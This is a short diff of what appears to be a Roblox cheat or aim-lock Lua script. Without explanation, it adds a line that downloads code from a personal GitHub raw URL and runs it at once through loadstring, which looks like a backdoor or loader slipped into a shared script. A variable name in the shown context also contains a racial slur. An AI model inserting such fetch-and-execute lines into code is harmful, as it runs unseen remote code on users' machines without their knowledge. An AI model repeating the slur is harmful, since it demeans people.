@@ -443,6 +443,9 @@ local nigga123xdlock8 = CustomLockSection:AddDropdown({
     end
 })
 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxprogamer2141274/oaoa/main/emoji3"))()
+
 --custom dot lock
 --custom dot lock
 --custom dot lock
